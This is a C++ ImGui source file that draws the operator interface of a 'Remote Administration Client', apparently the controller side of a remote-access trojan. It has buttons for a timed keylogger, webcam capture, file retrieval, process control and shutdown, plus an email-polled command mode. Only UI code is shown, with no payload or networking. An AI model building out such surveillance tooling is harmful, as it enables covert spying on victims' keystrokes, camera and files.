#include "RemoteAdminUI.h"

void RemoteAdminUI::RenderConnectionPanel() {
    if (ImGui::CollapsingHeader("Connection", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::PushItemWidth(300);
        
        ImGui::BeginDisabled(isConnected);
        ImGui::InputText("Server IP", serverIP, sizeof(serverIP));
        ImGui::SameLine();
        ImGui::InputText("Port", serverPort, sizeof(serverPort));
        ImGui::EndDisabled();
        
        ImGui::SameLine();
        if (ImGui::Button(isConnected ? "Disconnect" : "Connect")) {
            HandleConnect();
        }
        
        ImGui::PopItemWidth();
        
        // Status indicator
        ImGui::Text("Status: ");
        ImGui::SameLine();
        ImGui::PushStyleColor(ImGuiCol_Text, isConnected ? Colors::SUCCESS : Colors::ERROR);
        ImGui::Text("%s", connectionStatus.c_str());
        ImGui::PopStyleColor();
    }
}

void RemoteAdminUI::RenderModeSwitch() {
    if (ImGui::CollapsingHeader("Mode Selection", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::BeginDisabled(activeCommand != CommandState::IDLE);
        
        if (ImGui::RadioButton("Email Mode", currentMode == UIMode::EMAIL)) {
            currentMode = UIMode::EMAIL;
            lastCheckTime = std::chrono::steady_clock::now() - std::chrono::seconds(15);
        }
        
        ImGui::SameLine();
        
        if (ImGui::RadioButton("Manual Mode", currentMode == UIMode::MANUAL)) {
            currentMode = UIMode::MANUAL;
        }
        
        ImGui::EndDisabled();
        
        if (activeCommand != CommandState::IDLE) {
            ImGui::PushStyleColor(ImGuiCol_Text, Colors::WARNING);
            ImGui::Text("Command is running... Please wait.");
            ImGui::PopStyleColor();
        }
    }
}

void RemoteAdminUI::RenderEmailMode() {
    if (ImGui::CollapsingHeader("Email Command Monitor", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::Text("Last Check: %s", lastEmailCheck.c_str());
        ImGui::Text("Status: %s", emailStatus.c_str());
        ImGui::Separator();
        ImGui::TextWrapped("Automatically checking for email commands every 5 seconds...");
    }
}

void RemoteAdminUI::RenderProcessManagement() {
    if (ImGui::TreeNode("Process Management")) {
        if (ImGui::Button("List Processes")) {
            ExecuteCommand(CommandState::LIST_PROCESSES);
        }
        
        ImGui::PushItemWidth(200);
        ImGui::InputText("Process Name", processName, sizeof(processName));
        ImGui::PopItemWidth();
        
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(processName) == 0);
        if (ImGui::Button("Start##Process")) {
            ExecuteCommand(CommandState::START_PROCESS);
        }
        ImGui::SameLine();
        if (ImGui::Button("Kill##Process")) {
            ExecuteCommand(CommandState::KILL_PROCESS);
        }
        ImGui::EndDisabled();
        
        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderApplicationManagement() {
    if (ImGui::TreeNode("Application Management")) {
        if (ImGui::Button("List Apps")) {
            ExecuteCommand(CommandState::LIST_APPS);
        }
        
        ImGui::PushItemWidth(200);
        ImGui::InputText("Application Name", appName, sizeof(appName));
        ImGui::PopItemWidth();
        
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(appName) == 0);
        if (ImGui::Button("Start##App")) {
            ExecuteCommand(CommandState::START_APP);
        }
        ImGui::SameLine();
        if (ImGui::Button("Stop##App")) {
            ExecuteCommand(CommandState::STOP_APP);
        }
        ImGui::EndDisabled();
        
        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderSystemCommands() {
    if (ImGui::TreeNode("System Commands")) {
        if (ImGui::Button("Shutdown")) {
            ExecuteCommand(CommandState::SHUTDOWN);
        }
        ImGui::SameLine();
        if (ImGui::Button("Restart")) {
            ExecuteCommand(CommandState::RESTART);
        }
        
        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderMonitoringAndFiles() {
    if (ImGui::TreeNode("Monitoring & Files")) {
        // Keylogger
        ImGui::Text("Keylogger:");
        ImGui::SameLine();
        ImGui::PushItemWidth(200);
        ImGui::InputInt("Duration (seconds)", &keyloggerDuration);
        ImGui::PopItemWidth();
        ImGui::SameLine();
        if (ImGui::Button("Start Keylogger")) {
            ExecuteCommand(CommandState::KEYLOGGER);
        }
        
        // Webcam
        if (ImGui::Button("Capture Webcam")) {
            ExecuteCommand(CommandState::WEBCAM);
        }
        
        // File operations
        ImGui::PushItemWidth(300);
        ImGui::InputText("File Path", filePath, sizeof(filePath));
        ImGui::PopItemWidth();
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(filePath) == 0);
        if (ImGui::Button("Get File")) {
            ExecuteCommand(CommandState::GET_FILE);
        }
        ImGui::EndDisabled();
        
        ImGui::PushItemWidth(300);
        ImGui::InputText("Directory Path", directoryPath, sizeof(directoryPath));
        ImGui::PopItemWidth();
        ImGui::SameLine();
        ImGui::BeginDisabled(strlen(directoryPath) == 0);
        if (ImGui::Button("List Directory")) {
            ExecuteCommand(CommandState::LIST_DIRECTORY);
        }
        ImGui::EndDisabled();
        
        ImGui::TreePop();
    }
}

void RemoteAdminUI::RenderManualMode() {
    bool isDisabled = !isConnected || activeCommand != CommandState::IDLE;
    
    if (ImGui::CollapsingHeader("Manual Commands", ImGuiTreeNodeFlags_DefaultOpen)) {
        ImGui::BeginDisabled(isDisabled);
        
        RenderProcessManagement();
        RenderApplicationManagement();
        RenderSystemCommands();
        RenderMonitoringAndFiles();
        
        ImGui::EndDisabled();
    }
}

void RemoteAdminUI::RenderResults() {
    if (ImGui::CollapsingHeader("Results", ImGuiTreeNodeFlags_DefaultOpen)) {
        if (ImGui::BeginChild("ResultsScrolling", ImVec2(0, 300), true)) {
            for (const auto& result : results) {
                ImGui::PushStyleColor(ImGuiCol_Text, result.color);
                ImGui::Text("[%s] %s", result.timestamp.c_str(), result.message.c_str());
                ImGui::PopStyleColor();
            }
            
            // Auto-scroll to bottom
            if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY())
                ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();
        
        if (ImGui::Button("Clear Results")) {
            results.clear();
        }
    }
}

void RemoteAdminUI::Render() {
    // Update email checking
    CheckEmailAutomatically();
    
    // Create fullscreen window
    ImGui::Begin("Remote Administration Client", nullptr, 
                 ImGuiWindowFlags_NoResize | 
                 ImGuiWindowFlags_NoMove | 
                 ImGuiWindowFlags_NoCollapse);
    
    RenderConnectionPanel();
    RenderModeSwitch();
    
    if (currentMode == UIMode::EMAIL) {
        RenderEmailMode();
    } else {
        RenderManualMode();
    }
    
    RenderResults();
    
    ImGui::End();
}